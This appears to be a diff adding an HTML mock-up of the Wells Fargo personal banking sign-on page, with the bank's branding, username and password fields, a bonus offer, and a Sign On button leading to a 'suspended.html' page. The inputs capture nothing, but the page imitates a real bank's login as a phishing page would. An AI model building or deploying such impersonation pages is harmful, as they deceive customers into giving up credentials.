@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wells Fargo</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f7f5f4;
+    }
+    .topbar {
+      background-color: #d52b1e;
+      color: white;
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .topbar span {
+      font-weight: bold;
+      font-size: 24px;
+    }
+    .nav {
+      background: #fff;
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-around;
+      font-size: 14px;
+      border-bottom: 1px solid #ddd;
+    }
+    .nav div {
+      padding: 8px 12px;
+      cursor: pointer;
+    }
+    .nav .active {
+      border-bottom: 2px solid black;
+      font-weight: bold;
+    }
+    .content {
+      display: flex;
+      justify-content: center;
+      padding: 40px 20px;
+      background: #f5f3f1;
+    }
+    .login-box {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 300px;
+      margin-right: 40px;
+    }
+    .login-box h3 {
+      margin-top: 0;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 8px;
+      margin: 8px 0;
+      border: 1px solid #aaa;
+      border-radius: 4px;
+    }
+    .checkbox {
+      display: flex;
+      align-items: center;
+      margin: 10px 0;
+    }
+    .checkbox input {
+      margin-right: 5px;
+    }
+    .login-box a button {
+      width: 100%;
+      background: #d52b1e;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .offer-box {
+      max-width: 500px;
+    }
+    .offer-box h1 {
+      font-size: 32px;
+    }
+    .offer-box .highlight {
+      font-size: 60px;
+      color: purple;
+      font-weight: bold;
+    }
+    .offer-box button {
+      padding: 10px 20px;
+      border: 1px solid #000;
+      background: white;
+      cursor: pointer;
+      font-weight: bold;
+      border-radius: 25px;
+    }
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <span>WELLS FARGO</span>
+    <div>
+      <a href="#" style="color: white; margin-right: 15px;">ATMs/Locations</a>
+      <a href="#" style="color: white; margin-right: 15px;">Help</a>
+      <a href="#" style="color: white; margin-right: 15px;">Español</a>
+      <button style="padding: 6px 12px; border-radius: 20px; border: none; background: white; color: #d52b1e; font-weight: bold;">Sign On</button>
+    </div>
+  </div>
+
+  <div class="nav">
+    <div class="active">Personal</div>
+    <div>Investing & Wealth Management</div>
+    <div>Small Business</div>
+    <div>Commercial Banking</div>
+    <div>Corporate & Investment Banking</div>
+    <div>About Wells Fargo</div>
+  </div>
+
+  <div class="nav" style="font-size: 13px; border-top: none;">
+    <div>Checking</div>
+    <div>Savings & CDs</div>
+    <div>Credit Cards</div>
+    <div>Home Loans</div>
+    <div>Personal Loans</div>
+    <div>Auto Loans</div>
+    <div>Premier</div>
+    <div>Education & Tools</div>
+  </div>
+
+  <div class="content">
+    <div class="login-box">
+      <h3>Good evening</h3>
+      <p>Sign on to manage your accounts.</p>
+      <input type="text" placeholder="Username">
+      <input type="password" placeholder="Password">
+      <div class="checkbox">
+        <input type="checkbox" id="save">
+        <label for="save">Save username</label>
+      </div>
+      <a href="suspended.html"><button>Sign On</button></a>
+      <p style="font-size: 13px; text-align: center; margin-top: 10px;">
+        <a href="#">Enroll</a>
+      </p>
+      <p style="font-size: 12px;">
+        <a href="#">Forgot username or password?</a><br>
+        <a href="#">Security Center</a><br>
+        <a href="#">Privacy, Cookies, and Legal</a>
+      </p>
+    </div>
+
+    <div class="offer-box">
+      <h1>$300 checking bonus on us</h1>
+      <p>New customers open an eligible checking account with qualifying direct deposits</p>
+      <button>Get started >></button>
+      <p style="margin-top: 40px; font-size: 22px;">Enjoy</p>
+      <p class="highlight">$300</p>
+    </div>
+  </div>
+</body>
+</html>
